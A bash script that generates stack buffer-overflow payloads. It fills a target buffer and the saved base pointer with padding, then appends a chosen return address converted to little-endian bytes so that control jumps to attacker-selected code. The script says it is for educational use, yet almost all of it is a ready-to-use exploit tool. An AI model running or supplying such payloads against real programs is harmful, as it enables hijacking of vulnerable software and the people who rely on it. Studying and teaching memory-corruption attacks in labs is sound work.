#!/bin/bash

###############################################################################
# GLOBALS #####################################################################

# ATTRIBUTES ##################################################################
glbScriptName="${0##*/}"
glbIntegerRegex='^[0-9]+$'

# PATHS #######################################################################
glbScriptPath="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && echo "${PWD}" )"

# FLAGS #######################################################################
glbTargetArch=x86

# LOG MESSAGES ################################################################
glbLogE="[ERROR]"
glbLogI="[INFO]"
glbLogS="[SUCCESS]"
glbLogW="[WARN]"

###############################################################################
# FUNCTIONS ###################################################################

# print_usage
# Outputs a help page describing how to use this script.
print_usage() {

    echo "[ABOUT ${glbScriptName}]"
    echo "    Use this script to overflow buffers and run unintended code."
    echo "    Note: This script only supports little-endian systems."
    echo "    WARNING. This script is for educational purposes only!"
    echo "    Using this script for any malicious purposes is bad and illegal."
    echo "    The author(s) of this script are not responsible for its users' actions."

    echo ""

    echo "[USAGE]"
    echo "    ${glbScriptName} [-a 0x40262c -s 10] [-h] [-t x64]"

    echo ""

    echo "[OPTIONS]"
    echo "    -a    The hex address of the code to jump to."
    echo "          Example: '${glbScriptName} -a 0x40262c -s 10'"
    echo "    -h    Displays this help page."
    echo "    -s    The size of the target buffer."
    echo "          Example: '${glbScriptName} -s 10 -a 0x40262c'"
    echo "    -t    The target architecture. If not specified, then x86 is used."
    echo "          Example: '${glbScriptName} -t x64 -s 10 -a 0x40262c'"

}

get_payload() {

    local hexAddress="${1}"
    local bufferSizeInBytes=${2}
    local basePointerSizeInBytes=$(get_stack_base_pointer_size)
    local totalOverwriteSize=$(( ${bufferSizeInBytes} + ${basePointerSizeInBytes} ))
    local rawAddress="$(get_raw_address ${hexAddress})"
    local payload="$(get_repeated_string ${totalOverwriteSize})${rawAddress}"

    echo "${payload}"

}

get_stack_base_pointer_size() {

    local sizeInBytes=4

    if [ "${glbTargetArch}" = "x86" ]
    then
        sizeInBytes=4
    elif [ "${glbTargetArch}" = "x64" ]
    then
        sizeInBytes=8
    fi

    echo "${sizeInBytes}"

}

get_raw_address() {

    local hexAddress="${1}"
    local byte=""
    local bytes=()
    local bytesSize=$(( ${#hexAddress} / 2 - 1))
    local bytesIndex=${bytesSize}
    local assembledBytes=""

    # Reverse the hex address for little-endian systems.
    # I.e., '0x40262c' becomes '2c2640'.
    for i in $(seq 1 ${#hexAddress}); do

        byte="${byte}${hexAddress:i-1:1}"

        if [ $(( ${i} % 2 )) -eq 0 ] 2> /dev/null
        then
            # When rebuilding the address, we need to add '\x' to indicate we
            # want the ASCII representation of the hex address.
            byte="\x${byte}"
            bytes[${bytesIndex}]="${byte}"
            byte=""
            ((bytesIndex--))
        fi

    done

    for byte in "${bytes[@]}"; do

        assembledBytes="${assembledBytes}${byte}"

    done

    # The '-e' argument allows 'echo' to print an ASCII representation of
    # each byte.
    echo -e "${assembledBytes}"

}

get_repeated_string() {

    local repeatCount=${1}
    local charToRepeat="a"
    local finalString=""

    if [ -z "${repeatCount}" ] \
    || ! [[ ${bufferSize} =~ ${glbIntegerRegex} ]] 2> /dev/null
    then
        repeatCount=1
    fi

    for i in $(seq 1 ${repeatCount}); do

        finalString="${finalString}${charToRepeat}"

    done

    echo "${finalString}"

}

###############################################################################
# MAIN ########################################################################

if [ "${#}" -eq 0 ]
then
    print_usage
    exit
fi

targetHexAddress=""
bufferSize=""

while getopts :a:hs:t: opt; do

    case "${opt}" in

        'a' )
            if [[ "${OPTARG}" == "0x"* ]]
            then
                # If the user specified an optional '0x' prefix, then remove it.
                targetHexAddress="${OPTARG##*'0x'}"
            else
                targetHexAddress="${OPTARG}"
            fi
            if [ $(( ${#targetHexAddress} % 2 )) -ne 0 ] 2> /dev/null
            then
                echo "${glbLogE} You have specified an invalid hexadecimal address."
                exit 1
            fi
            ;;

        'h' )
            [ "${#}" -eq 1 ] && print_usage && exit
            ;;

        's' )
            bufferSize=${OPTARG}
            if ! [[ ${bufferSize} =~ ${glbIntegerRegex} ]] 2> /dev/null
            then
                echo "${glbLogE} You must specify an integer for the buffer size."
                exit 1
            fi
            ;;

        't' )
            glbTargetArch="${OPTARG}"
            ;;

        \? )
            echo "${glbLogE} Unknown argument: '-${OPTARG}'."
            exit 1
            ;;

        : )
            echo "${glbLogE} Option '-${OPTARG}' requires an argument."
            exit 1
            ;;

    esac

done

get_payload "${targetHexAddress}" "${bufferSize}"

exit
